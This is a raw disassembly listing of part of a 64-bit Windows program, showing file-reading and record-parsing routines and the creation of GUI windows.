   140001730:	49 3b f5             	cmp    %r13,%rsi
   140001733:	48 8b ee             	mov    %rsi,%rbp
   140001736:	4d 8b cf             	mov    %r15,%r9
   140001739:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000173f:	49 0f 47 ed          	cmova  %r13,%rbp
   140001743:	49 8b ce             	mov    %r14,%rcx
   140001746:	48 8b d5             	mov    %rbp,%rdx
   140001749:	e8 6e df 00 00       	call   0x14000f6bc
   14000174e:	48 83 f8 01          	cmp    $0x1,%rax
   140001752:	72 31                	jb     0x140001785
   140001754:	4d 8b cc             	mov    %r12,%r9
   140001757:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000175d:	48 8b d5             	mov    %rbp,%rdx
   140001760:	49 8b ce             	mov    %r14,%rcx
   140001763:	e8 94 e6 00 00       	call   0x14000fdfc
   140001768:	48 83 f8 01          	cmp    $0x1,%rax
   14000176c:	72 07                	jb     0x140001775
   14000176e:	48 2b f5             	sub    %rbp,%rsi
   140001771:	75 bd                	jne    0x140001730
   140001773:	eb 2c                	jmp    0x1400017a1
   140001775:	48 8d 15 bc a0 02 00 	lea    0x2a0bc(%rip),%rdx        # 0x14002b838
   14000177c:	48 8d 0d e9 a0 02 00 	lea    0x2a0e9(%rip),%rcx        # 0x14002b86c
   140001783:	eb 0e                	jmp    0x140001793
   140001785:	48 8d 15 6c a0 02 00 	lea    0x2a06c(%rip),%rdx        # 0x14002b7f8
   14000178c:	48 8d 0d 99 a0 02 00 	lea    0x2a099(%rip),%rcx        # 0x14002b82c
   140001793:	4c 8d 47 12          	lea    0x12(%rdi),%r8
   140001797:	e8 c4 0f 00 00       	call   0x140002760
   14000179c:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400017a1:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1400017a6:	49 8b ce             	mov    %r14,%rcx
   1400017a9:	e8 ae 29 01 00       	call   0x14001415c
   1400017ae:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400017b3:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
   1400017b8:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   1400017bd:	49 8b cf             	mov    %r15,%rcx
   1400017c0:	e8 a7 db 00 00       	call   0x14000f36c
   1400017c5:	49 8b cc             	mov    %r12,%rcx
   1400017c8:	e8 9f db 00 00       	call   0x14000f36c
   1400017cd:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   1400017d2:	8b c3                	mov    %ebx,%eax
   1400017d4:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   1400017d9:	48 83 c4 38          	add    $0x38,%rsp
   1400017dd:	5f                   	pop    %rdi
   1400017de:	5b                   	pop    %rbx
   1400017df:	c3                   	ret
   1400017e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400017e5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400017ea:	57                   	push   %rdi
   1400017eb:	48 83 ec 20          	sub    $0x20,%rsp
   1400017ef:	48 8b 99 08 10 00 00 	mov    0x1008(%rcx),%rbx
   1400017f6:	48 8b f2             	mov    %rdx,%rsi
   1400017f9:	48 8b f9             	mov    %rcx,%rdi
   1400017fc:	48 3b 99 10 10 00 00 	cmp    0x1010(%rcx),%rbx
   140001803:	73 70                	jae    0x140001875
   140001805:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000180c:	00 00 00 00 
   140001810:	44 0f b6 43 11       	movzbl 0x11(%rbx),%r8d
   140001815:	41 8d 40 a6          	lea    -0x5a(%r8),%eax
   140001819:	a8 f7                	test   $0xf7,%al
   14000181b:	74 3a                	je     0x140001857
   14000181d:	41 80 f8 64          	cmp    $0x64,%r8b
   140001821:	74 34                	je     0x140001857
   140001823:	41 80 f8 6e          	cmp    $0x6e,%r8b
   140001827:	74 2e                	je     0x140001857
   140001829:	41 80 f8 78          	cmp    $0x78,%r8b
   14000182d:	74 28                	je     0x140001857
   14000182f:	48 8d 43 12          	lea    0x12(%rbx),%rax
   140001833:	4c 8b c6             	mov    %rsi,%r8
   140001836:	4c 2b c0             	sub    %rax,%r8
   140001839:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001840:	0f b6 10             	movzbl (%rax),%edx
   140001843:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140001848:	2b d1                	sub    %ecx,%edx
   14000184a:	75 07                	jne    0x140001853
   14000184c:	48 ff c0             	inc    %rax
   14000184f:	85 c9                	test   %ecx,%ecx
   140001851:	75 ed                	jne    0x140001840
   140001853:	85 d2                	test   %edx,%edx
   140001855:	eb 0e                	jmp    0x140001865
   140001857:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   14000185b:	48 8b d6             	mov    %rsi,%rdx
   14000185e:	e8 ed 29 01 00       	call   0x140014250
   140001863:	85 c0                	test   %eax,%eax
   140001865:	74 20                	je     0x140001887
   140001867:	8b 03                	mov    (%rbx),%eax
   140001869:	48 03 d8             	add    %rax,%rbx
   14000186c:	48 3b 9f 10 10 00 00 	cmp    0x1010(%rdi),%rbx
   140001873:	72 9b                	jb     0x140001810
   140001875:	33 c0                	xor    %eax,%eax
   140001877:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000187c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001881:	48 83 c4 20          	add    $0x20,%rsp
   140001885:	5f                   	pop    %rdi
   140001886:	c3                   	ret
   140001887:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000188c:	48 8b c3             	mov    %rbx,%rax
   14000188f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001894:	48 83 c4 20          	add    $0x20,%rsp
   140001898:	5f                   	pop    %rdi
   140001899:	c3                   	ret
   14000189a:	cc                   	int3
   14000189b:	cc                   	int3
   14000189c:	cc                   	int3
   14000189d:	cc                   	int3
   14000189e:	cc                   	int3
   14000189f:	cc                   	int3
   1400018a0:	40 53                	rex push %rbx
   1400018a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400018a6:	48 8b 19             	mov    (%rcx),%rbx
   1400018a9:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   1400018b0:	48 85 db             	test   %rbx,%rbx
   1400018b3:	74 19                	je     0x1400018ce
   1400018b5:	48 8b 8b 08 10 00 00 	mov    0x1008(%rbx),%rcx
   1400018bc:	e8 9b 28 01 00       	call   0x14001415c
   1400018c1:	48 8b cb             	mov    %rbx,%rcx
   1400018c4:	48 83 c4 20          	add    $0x20,%rsp
   1400018c8:	5b                   	pop    %rbx
   1400018c9:	e9 8e 28 01 00       	jmp    0x14001415c
   1400018ce:	48 83 c4 20          	add    $0x20,%rsp
   1400018d2:	5b                   	pop    %rbx
   1400018d3:	c3                   	ret
   1400018d4:	cc                   	int3
   1400018d5:	cc                   	int3
   1400018d6:	cc                   	int3
   1400018d7:	cc                   	int3
   1400018d8:	cc                   	int3
   1400018d9:	cc                   	int3
   1400018da:	cc                   	int3
   1400018db:	cc                   	int3
   1400018dc:	cc                   	int3
   1400018dd:	cc                   	int3
   1400018de:	cc                   	int3
   1400018df:	cc                   	int3
   1400018e0:	8b 02                	mov    (%rdx),%eax
   1400018e2:	48 03 c2             	add    %rdx,%rax
   1400018e5:	c3                   	ret
   1400018e6:	cc                   	int3
   1400018e7:	cc                   	int3
   1400018e8:	cc                   	int3
   1400018e9:	cc                   	int3
   1400018ea:	cc                   	int3
   1400018eb:	cc                   	int3
   1400018ec:	cc                   	int3
   1400018ed:	cc                   	int3
   1400018ee:	cc                   	int3
   1400018ef:	cc                   	int3
   1400018f0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400018f5:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400018fa:	57                   	push   %rdi
   1400018fb:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001902:	48 8b 05 37 c7 03 00 	mov    0x3c737(%rip),%rax        # 0x14003e040
   140001909:	48 33 c4             	xor    %rsp,%rax
   14000190c:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140001913:	00 
   140001914:	48 8d 15 59 9f 02 00 	lea    0x29f59(%rip),%rdx        # 0x14002b874
   14000191b:	48 8b e9             	mov    %rcx,%rbp
   14000191e:	33 db                	xor    %ebx,%ebx
   140001920:	e8 4b 26 00 00       	call   0x140003f70
   140001925:	48 8b f8             	mov    %rax,%rdi
   140001928:	48 85 c0             	test   %rax,%rax
   14000192b:	0f 84 90 02 00 00    	je     0x140001bc1
   140001931:	48 8b 05 20 ba 02 00 	mov    0x2ba20(%rip),%rax        # 0x14002d358
   140001938:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   14000193f:	00 
   140001940:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140001947:	00 
   140001948:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000194e:	48 c1 e8 18          	shr    $0x18,%rax
   140001952:	48 8b cf             	mov    %rdi,%rcx
   140001955:	04 0c                	add    $0xc,%al
   140001957:	48 89 b4 24 a8 00 00 	mov    %rsi,0xa8(%rsp)
   14000195e:	00 
   14000195f:	88 84 24 83 00 00 00 	mov    %al,0x83(%rsp)
   140001966:	e8 35 5d 00 00       	call   0x1400076a0
   14000196b:	48 8b f0             	mov    %rax,%rsi
   14000196e:	48 85 c0             	test   %rax,%rax
   140001971:	0f 84 37 02 00 00    	je     0x140001bae
   140001977:	45 33 c0             	xor    %r8d,%r8d
   14000197a:	48 8b d0             	mov    %rax,%rdx
   14000197d:	48 8b cf             	mov    %rdi,%rcx
   140001980:	e8 6f e0 00 00       	call   0x14000f9f4
   140001985:	85 c0                	test   %eax,%eax
   140001987:	79 18                	jns    0x1400019a1
   140001989:	48 8d 15 20 a0 02 00 	lea    0x2a020(%rip),%rdx        # 0x14002b9b0
   140001990:	48 8d 0d 55 9f 02 00 	lea    0x29f55(%rip),%rcx        # 0x14002b8ec
   140001997:	e8 c4 0d 00 00       	call   0x140002760
   14000199c:	e9 0d 02 00 00       	jmp    0x140001bae
   1400019a1:	4c 8b cf             	mov    %rdi,%r9
   1400019a4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400019a9:	ba 58 00 00 00       	mov    $0x58,%edx
   1400019ae:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400019b4:	e8 03 dd 00 00       	call   0x14000f6bc
   1400019b9:	48 83 f8 01          	cmp    $0x1,%rax
   1400019bd:	73 18                	jae    0x1400019d7
   1400019bf:	48 8d 15 12 a0 02 00 	lea    0x2a012(%rip),%rdx        # 0x14002b9d8
   1400019c6:	48 8d 0d 5f 9e 02 00 	lea    0x29e5f(%rip),%rcx        # 0x14002b82c
   1400019cd:	e8 8e 0d 00 00       	call   0x140002760
   1400019d2:	e9 d7 01 00 00       	jmp    0x140001bae
   1400019d7:	ba 60 10 00 00       	mov    $0x1060,%edx
   1400019dc:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400019e1:	e8 6e 27 01 00       	call   0x140014154
   1400019e6:	48 8b d8             	mov    %rax,%rbx
   1400019e9:	48 85 c0             	test   %rax,%rax
   1400019ec:	75 18                	jne    0x140001a06
   1400019ee:	48 8d 15 fb 9f 02 00 	lea    0x29ffb(%rip),%rdx        # 0x14002b9f0
   1400019f5:	48 8d 0d 28 a0 02 00 	lea    0x2a028(%rip),%rcx        # 0x14002ba24
   1400019fc:	e8 5f 0d 00 00       	call   0x140002760
   140001a01:	e9 a8 01 00 00       	jmp    0x140001bae
   140001a06:	4c 8b cd             	mov    %rbp,%r9
   140001a09:	4c 8d 05 1c a0 02 00 	lea    0x2a01c(%rip),%r8        # 0x14002ba2c
   140001a10:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001a15:	48 8b cb             	mov    %rbx,%rcx
   140001a18:	e8 d3 01 00 00       	call   0x140001bf0
   140001a1d:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001a21:	48 8d 8b 20 10 00 00 	lea    0x1020(%rbx),%rcx
   140001a28:	0f c8                	bswap  %eax
   140001a2a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001a2e:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140001a33:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140001a37:	4c 8d 05 ee 9f 02 00 	lea    0x29fee(%rip),%r8        # 0x14002ba2c
   140001a3e:	0f c8                	bswap  %eax
   140001a40:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140001a44:	ba 40 00 00 00       	mov    $0x40,%edx
   140001a49:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001a4d:	0f c8                	bswap  %eax
   140001a4f:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140001a53:	8b 44 24 34          	mov    0x34(%rsp),%eax
   140001a57:	0f c8                	bswap  %eax
   140001a59:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140001a5d:	89 83 1c 10 00 00    	mov    %eax,0x101c(%rbx)
   140001a63:	e8 88 01 00 00       	call   0x140001bf0
   140001a68:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001a6c:	45 33 c0             	xor    %r8d,%r8d
   140001a6f:	48 2b f0             	sub    %rax,%rsi
   140001a72:	48 8b cf             	mov    %rdi,%rcx
   140001a75:	48 8d 46 58          	lea    0x58(%rsi),%rax
   140001a79:	48 89 83 00 10 00 00 	mov    %rax,0x1000(%rbx)
   140001a80:	8b 54 24 2c          	mov    0x2c(%rsp),%edx
   140001a84:	48 03 d0             	add    %rax,%rdx
   140001a87:	e8 68 df 00 00       	call   0x14000f9f4
   140001a8c:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140001a90:	e8 db 26 01 00       	call   0x140014170
   140001a95:	48 89 83 08 10 00 00 	mov    %rax,0x1008(%rbx)
   140001a9c:	48 85 c0             	test   %rax,%rax
   140001a9f:	75 18                	jne    0x140001ab9
   140001aa1:	48 8d 15 88 9f 02 00 	lea    0x29f88(%rip),%rdx        # 0x14002ba30
   140001aa8:	48 8d 0d 65 9c 02 00 	lea    0x29c65(%rip),%rcx        # 0x14002b714
   140001aaf:	e8 ac 0c 00 00       	call   0x140002760
   140001ab4:	e9 f5 00 00 00       	jmp    0x140001bae
   140001ab9:	8b 54 24 30          	mov    0x30(%rsp),%edx
   140001abd:	4c 8b cf             	mov    %rdi,%r9
   140001ac0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001ac6:	48 8b c8             	mov    %rax,%rcx
   140001ac9:	e8 ee db 00 00       	call   0x14000f6bc
   140001ace:	48 83 f8 01          	cmp    $0x1,%rax
   140001ad2:	73 18                	jae    0x140001aec
   140001ad4:	48 8d 15 7d 9f 02 00 	lea    0x29f7d(%rip),%rdx        # 0x14002ba58
   140001adb:	48 8d 0d 4a 9d 02 00 	lea    0x29d4a(%rip),%rcx        # 0x14002b82c
   140001ae2:	e8 79 0c 00 00       	call   0x140002760
   140001ae7:	e9 c2 00 00 00       	jmp    0x140001bae
   140001aec:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001af0:	48 8b cf             	mov    %rdi,%rcx
   140001af3:	48 03 83 08 10 00 00 	add    0x1008(%rbx),%rax
   140001afa:	48 89 83 10 10 00 00 	mov    %rax,0x1010(%rbx)
   140001b01:	e8 2a d9 00 00       	call   0x14000f430
   140001b06:	85 c0                	test   %eax,%eax
   140001b08:	74 11                	je     0x140001b1b
   140001b0a:	48 8d 0d 67 9f 02 00 	lea    0x29f67(%rip),%rcx        # 0x14002ba78
   140001b11:	e8 da 0a 00 00       	call   0x1400025f0
   140001b16:	e9 93 00 00 00       	jmp    0x140001bae
   140001b1b:	48 8b 93 08 10 00 00 	mov    0x1008(%rbx),%rdx
   140001b22:	48 3b 93 10 10 00 00 	cmp    0x1010(%rbx),%rdx
   140001b29:	0f 83 7f 00 00 00    	jae    0x140001bae
   140001b2f:	44 8b 05 e2 c4 03 00 	mov    0x3c4e2(%rip),%r8d        # 0x14003e018
   140001b36:	66 0f 6f 0d 52 9f 02 	movdqa 0x29f52(%rip),%xmm1        # 0x14002ba90
   140001b3d:	00 
   140001b3e:	66 90                	xchg   %ax,%ax
   140001b40:	33 c0                	xor    %eax,%eax
   140001b42:	41 83 f8 02          	cmp    $0x2,%r8d
   140001b46:	7c 18                	jl     0x140001b60
   140001b48:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140001b4c:	66 0f 38 00 c1       	pshufb %xmm1,%xmm0
   140001b51:	f3 0f 7f 02          	movdqu %xmm0,(%rdx)
   140001b55:	eb 1a                	jmp    0x140001b71
   140001b57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001b5e:	00 00 
   140001b60:	8b 0c 82             	mov    (%rdx,%rax,4),%ecx
   140001b63:	0f c9                	bswap  %ecx
   140001b65:	89 0c 82             	mov    %ecx,(%rdx,%rax,4)
   140001b68:	48 ff c0             	inc    %rax
   140001b6b:	48 83 f8 04          	cmp    $0x4,%rax
   140001b6f:	7c ef                	jl     0x140001b60
   140001b71:	0f b6 4a 11          	movzbl 0x11(%rdx),%ecx
   140001b75:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140001b78:	a8 f7                	test   $0xf7,%al
   140001b7a:	74 13                	je     0x140001b8f
   140001b7c:	80 f9 64             	cmp    $0x64,%cl
   140001b7f:	74 0e                	je     0x140001b8f
   140001b81:	80 f9 6e             	cmp    $0x6e,%cl
   140001b84:	74 09                	je     0x140001b8f
   140001b86:	80 f9 78             	cmp    $0x78,%cl
   140001b89:	74 04                	je     0x140001b8f
   140001b8b:	32 c0                	xor    %al,%al
   140001b8d:	eb 02                	jmp    0x140001b91
   140001b8f:	b0 01                	mov    $0x1,%al
   140001b91:	0a 83 18 10 00 00    	or     0x1018(%rbx),%al
   140001b97:	0f 95 c0             	setne  %al
   140001b9a:	88 83 18 10 00 00    	mov    %al,0x1018(%rbx)
   140001ba0:	8b 02                	mov    (%rdx),%eax
   140001ba2:	48 03 d0             	add    %rax,%rdx
   140001ba5:	48 3b 93 10 10 00 00 	cmp    0x1010(%rbx),%rdx
   140001bac:	72 92                	jb     0x140001b40
   140001bae:	48 8b cf             	mov    %rdi,%rcx
   140001bb1:	e8 b6 d7 00 00       	call   0x14000f36c
   140001bb6:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   140001bbd:	00 
   140001bbe:	48 8b c3             	mov    %rbx,%rax
   140001bc1:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   140001bc8:	00 
   140001bc9:	48 33 cc             	xor    %rsp,%rcx
   140001bcc:	e8 9f 9c 00 00       	call   0x14000b870
   140001bd1:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001bd8:	00 
   140001bd9:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140001bdd:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140001be1:	49 8b e3             	mov    %r11,%rsp
   140001be4:	5f                   	pop    %rdi
   140001be5:	c3                   	ret
   140001be6:	cc                   	int3
   140001be7:	cc                   	int3
   140001be8:	cc                   	int3
   140001be9:	cc                   	int3
   140001bea:	cc                   	int3
   140001beb:	cc                   	int3
   140001bec:	cc                   	int3
   140001bed:	cc                   	int3
   140001bee:	cc                   	int3
   140001bef:	cc                   	int3
   140001bf0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001bf5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001bfa:	53                   	push   %rbx
   140001bfb:	55                   	push   %rbp
   140001bfc:	56                   	push   %rsi
   140001bfd:	57                   	push   %rdi
   140001bfe:	48 83 ec 38          	sub    $0x38,%rsp
   140001c02:	49 8b f0             	mov    %r8,%rsi
   140001c05:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   140001c0a:	48 8b da             	mov    %rdx,%rbx
   140001c0d:	48 8b f9             	mov    %rcx,%rdi
   140001c10:	e8 2b f4 ff ff       	call   0x140001040
   140001c15:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140001c1a:	4c 8b ce             	mov    %rsi,%r9
   140001c1d:	4c 8b c3             	mov    %rbx,%r8
   140001c20:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001c27:	00 00 
   140001c29:	48 8b d7             	mov    %rdi,%rdx
   140001c2c:	48 8b 08             	mov    (%rax),%rcx
   140001c2f:	48 83 c9 02          	or     $0x2,%rcx
   140001c33:	e8 6c 20 01 00       	call   0x140013ca4
   140001c38:	85 c0                	test   %eax,%eax
   140001c3a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001c3f:	0f 48 c1             	cmovs  %ecx,%eax
   140001c42:	48 83 c4 38          	add    $0x38,%rsp
   140001c46:	5f                   	pop    %rdi
   140001c47:	5e                   	pop    %rsi
   140001c48:	5d                   	pop    %rbp
   140001c49:	5b                   	pop    %rbx
   140001c4a:	c3                   	ret
   140001c4b:	cc                   	int3
   140001c4c:	cc                   	int3
   140001c4d:	cc                   	int3
   140001c4e:	cc                   	int3
   140001c4f:	cc                   	int3
   140001c50:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001c55:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001c5a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001c5f:	57                   	push   %rdi
   140001c60:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140001c67:	48 8b 05 d2 c3 03 00 	mov    0x3c3d2(%rip),%rax        # 0x14003e040
   140001c6e:	48 33 c4             	xor    %rsp,%rax
   140001c71:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   140001c78:	00 
   140001c79:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001c7d:	4c 8d 05 1c 9e 02 00 	lea    0x29e1c(%rip),%r8        # 0x14002baa0
   140001c84:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   140001c88:	48 8b f9             	mov    %rcx,%rdi
   140001c8b:	48 83 c1 28          	add    $0x28,%rcx
   140001c8f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001c94:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001c99:	e8 92 08 00 00       	call   0x140002530
   140001c9e:	ff 15 7c 97 02 00    	call   *0x2977c(%rip)        # 0x14002b420
   140001ca4:	0f b7 c8             	movzwl %ax,%ecx
   140001ca7:	ba 32 00 00 00       	mov    $0x32,%edx
   140001cac:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001cb2:	8b d8                	mov    %eax,%ebx
   140001cb4:	ff 15 ee 93 02 00    	call   *0x293ee(%rip)        # 0x14002b0a8
   140001cba:	48 c1 eb 10          	shr    $0x10,%rbx
   140001cbe:	ba 0e 00 00 00       	mov    $0xe,%edx
   140001cc3:	0f b7 cb             	movzwl %bx,%ecx
   140001cc6:	bb 08 00 00 00       	mov    $0x8,%ebx
   140001ccb:	44 8b c3             	mov    %ebx,%r8d
   140001cce:	66 89 87 5a 20 00 00 	mov    %ax,0x205a(%rdi)
   140001cd5:	ff 15 cd 93 02 00    	call   *0x293cd(%rip)        # 0x14002b0a8
   140001cdb:	33 d2                	xor    %edx,%edx
   140001cdd:	c7 87 5e 20 00 00 20 	movl   $0x200020,0x205e(%rdi)
   140001ce4:	00 20 00 
   140001ce7:	41 b8 f4 01 00 00    	mov    $0x1f4,%r8d
   140001ced:	66 89 87 5c 20 00 00 	mov    %ax,0x205c(%rdi)
   140001cf4:	48 8d 4c 24 74       	lea    0x74(%rsp),%rcx
   140001cf9:	66 89 9f 58 20 00 00 	mov    %bx,0x2058(%rdi)
   140001d00:	e8 db 7a 02 00       	call   0x1400297e0
   140001d05:	45 33 c9             	xor    %r9d,%r9d
   140001d08:	c7 44 24 70 f8 01 00 	movl   $0x1f8,0x70(%rsp)
   140001d0f:	00 
   140001d10:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140001d15:	ba f8 01 00 00       	mov    $0x1f8,%edx
   140001d1a:	b9 29 00 00 00       	mov    $0x29,%ecx
   140001d1f:	ff 15 b3 96 02 00    	call   *0x296b3(%rip)        # 0x14002b3d8
   140001d25:	33 ed                	xor    %ebp,%ebp
   140001d27:	85 c0                	test   %eax,%eax
   140001d29:	74 10                	je     0x140001d3b
   140001d2b:	48 8d 8c 24 08 02 00 	lea    0x208(%rsp),%rcx
   140001d32:	00 
   140001d33:	ff 15 0f 93 02 00    	call   *0x2930f(%rip)        # 0x14002b048
   140001d39:	eb 03                	jmp    0x140001d3e
   140001d3b:	48 8b c5             	mov    %rbp,%rax
   140001d3e:	4c 8d 8f 50 20 00 00 	lea    0x2050(%rdi),%r9
   140001d45:	48 89 87 48 20 00 00 	mov    %rax,0x2048(%rdi)
   140001d4c:	ba 01 7f 00 00       	mov    $0x7f01,%edx
   140001d51:	33 c9                	xor    %ecx,%ecx
   140001d53:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001d59:	ff 15 c9 92 02 00    	call   *0x292c9(%rip)        # 0x14002b028
   140001d5f:	48 8b 07             	mov    (%rdi),%rax
   140001d62:	48 8d 15 b7 9d 02 00 	lea    0x29db7(%rip),%rdx        # 0x14002bb20
   140001d69:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001d6e:	41 b9 03 00 00 50    	mov    $0x50000003,%r9d
   140001d74:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001d79:	45 33 c0             	xor    %r8d,%r8d
   140001d7c:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001d80:	33 c9                	xor    %ecx,%ecx
   140001d82:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001d87:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001d8c:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001d93:	80 
   140001d94:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001d9b:	80 
   140001d9c:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001da3:	80 
   140001da4:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001dab:	80 
   140001dac:	ff 15 fe 95 02 00    	call   *0x295fe(%rip)        # 0x14002b3b0
   140001db2:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001db7:	48 8d 15 62 9d 02 00 	lea    0x29d62(%rip),%rdx        # 0x14002bb20
   140001dbe:	48 89 87 28 20 00 00 	mov    %rax,0x2028(%rdi)
   140001dc5:	41 b9 00 00 00 50    	mov    $0x50000000,%r9d
   140001dcb:	48 8b 07             	mov    (%rdi),%rax
   140001dce:	45 33 c0             	xor    %r8d,%r8d
   140001dd1:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001dd6:	33 c9                	xor    %ecx,%ecx
   140001dd8:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001ddc:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001de1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001de6:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001ded:	80 
   140001dee:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001df5:	80 
   140001df6:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001dfd:	80 
   140001dfe:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001e05:	80 
   140001e06:	ff 15 a4 95 02 00    	call   *0x295a4(%rip)        # 0x14002b3b0
   140001e0c:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001e11:	48 8d 15 18 9d 02 00 	lea    0x29d18(%rip),%rdx        # 0x14002bb30
   140001e18:	48 89 87 30 20 00 00 	mov    %rax,0x2030(%rdi)
   140001e1f:	41 b9 84 08 30 50    	mov    $0x50300884,%r9d
   140001e25:	48 8b 07             	mov    (%rdi),%rax
   140001e28:	45 33 c0             	xor    %r8d,%r8d
   140001e2b:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001e30:	b9 00 02 00 00       	mov    $0x200,%ecx
   140001e35:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001e39:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001e3e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001e43:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001e4a:	80 
   140001e4b:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001e52:	80 
   140001e53:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001e5a:	80 
   140001e5b:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001e62:	80 
   140001e63:	ff 15 47 95 02 00    	call   *0x29547(%rip)        # 0x14002b3b0
   140001e69:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001e6e:	4c 8d 05 cb 9c 02 00 	lea    0x29ccb(%rip),%r8        # 0x14002bb40
   140001e75:	48 89 87 38 20 00 00 	mov    %rax,0x2038(%rdi)
   140001e7c:	48 8d 15 cd 9c 02 00 	lea    0x29ccd(%rip),%rdx        # 0x14002bb50
   140001e83:	48 8b 07             	mov    (%rdi),%rax
   140001e86:	41 b9 01 00 00 50    	mov    $0x50000001,%r9d
   140001e8c:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001e91:	33 c9                	xor    %ecx,%ecx
   140001e93:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001e97:	48 c7 44 24 48 01 00 	movq   $0x1,0x48(%rsp)
   140001e9e:	00 00 
   140001ea0:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
